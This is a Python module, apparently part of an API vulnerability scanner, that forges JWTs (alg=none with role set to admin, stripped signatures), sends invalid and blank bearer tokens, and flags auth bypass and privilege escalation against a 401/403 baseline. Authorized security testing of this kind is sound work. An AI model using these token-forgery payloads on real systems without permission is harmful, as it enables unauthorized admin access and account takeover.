import base64
import json
from copy import deepcopy


class AuthStrategyEngine:

    def __init__(self, auth_attacker):
        self.auth_attacker = auth_attacker
        self.current_token = None

    # -------------------------
    # TOKEN EXTRACTION (STATEFUL CORE)
    # -------------------------
    def extract_token(self, result, memory=None):
        try:
            body = result.get("response_body", "")
            data = json.loads(body)

            token = data.get("token") or data.get("access_token")

            if token:
                self.current_token = token

                # 🔥 store globally so ExecutionEngine can use it
                if memory:
                    memory.set("jwt_token", token)

        except Exception:
            pass

    # -------------------------
    # JWT HELPERS
    # -------------------------
    def _b64(self, data):
        return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b"=").decode()

    def _decode_payload(self, token):
        try:
            parts = token.split(".")
            return json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
        except:
            return None

    def _tamper_jwt(self, token):
        payload = self._decode_payload(token)
        if not payload:
            return token

        payload["role"] = "admin"
        payload["isAdmin"] = True

        header = {"alg": "none", "typ": "JWT"}

        # 🔥 Proper alg=none attack (signature removed)
        return f"{self._b64(header)}.{self._b64(payload)}."

    def _remove_signature(self, token):
        parts = token.split(".")
        if len(parts) == 3:
            return f"{parts[0]}.{parts[1]}."
        return token

    # -------------------------
    # AUTH PAYLOADS
    # -------------------------
    def get_auth_payloads(self):
        return [
            {},  # no auth

            {"__headers__": {"Authorization": "Bearer invalid.token"}},
            {"__headers__": {"Authorization": "Bearer null"}},
            {"__headers__": {"Authorization": "Bearer "}},

            {"__headers__": {"Authorization": "Bearer admin"}},

            {"__tamper_jwt__": True},
            {"__no_signature__": True},
        ]

    # -------------------------
    # TOKEN INJECTION
    # -------------------------
    def inject_token(self, payload):
        payload = deepcopy(payload)

        if not self.current_token:
            return payload

        token = self.current_token

        # 🔥 apply attacks
        if payload.get("__tamper_jwt__"):
            token = self._tamper_jwt(token)

        elif payload.get("__no_signature__"):
            token = self._remove_signature(token)

        headers = payload.get("__headers__", {})
        headers["Authorization"] = f"Bearer {token}"
        payload["__headers__"] = headers

        return payload

    # -------------------------
    # AUTH ANALYSIS (SMART)
    # -------------------------
    def process(self, endpoint, payload, result, memory, baseline=None):

        requires_auth = bool(endpoint.get("security"))

        findings = []

        if not result:
            return findings

        status = result.get("status_code", 0)
        body = str(result.get("response_body", "")).lower()

        headers = payload.get("__headers__", {})
        auth_header = headers.get("Authorization", "")

        baseline_status = baseline.get("status_code") if baseline else None

        # -------------------------
        # 1. NO AUTH BUT ACCESS
        # -------------------------
        if not headers and requires_auth:
            if baseline_status in [401, 403] and status == 200:
                findings.append({
                    "type": "Auth Bypass (No Token Required)",
                    "severity": "CRITICAL"
                })

        # -------------------------
        # 2. INVALID TOKEN ACCEPTED
        # -------------------------
        if "invalid" in auth_header:
            if baseline_status in [401, 403] and status == 200:
                findings.append({
                    "type": "Auth Bypass (Invalid Token Accepted)",
                    "severity": "CRITICAL"
                })

        # -------------------------
        # 3. TAMPERED TOKEN ACCEPTED
        # -------------------------
        if payload.get("__tamper_jwt__"):
            if baseline_status in [401, 403] and status == 200:
                findings.append({
                    "type": "JWT Tampering Accepted",
                    "severity": "CRITICAL"
                })

        # -------------------------
        # 4. NO SIGNATURE ACCEPTED
        # -------------------------
        if payload.get("__no_signature__"):
            if baseline_status in [401, 403] and status == 200:
                findings.append({
                    "type": "JWT No Signature Accepted",
                    "severity": "CRITICAL"
                })

        # -------------------------
        # 5. PRIVILEGE ESCALATION
        # -------------------------
        if "admin" in body and status == 200:
            if baseline and "admin" not in str(baseline.get("response_body", "")).lower():
                findings.append({
                    "type": "Privilege Escalation",
                    "severity": "HIGH"
                })

        # -------------------------
        # 6. TOKEN LEAK
        # -------------------------
        if "token" in body or "jwt" in body:
            findings.append({
                "type": "Token Exposure",
                "severity": "HIGH"
            })

        # -------------------------
        # 7. BROKEN AUTH LOGIC
        # -------------------------
        if status == 200 and "unauthorized" in body:
            findings.append({
                "type": "Broken Auth Logic",
                "severity": "HIGH"
            })

        return findings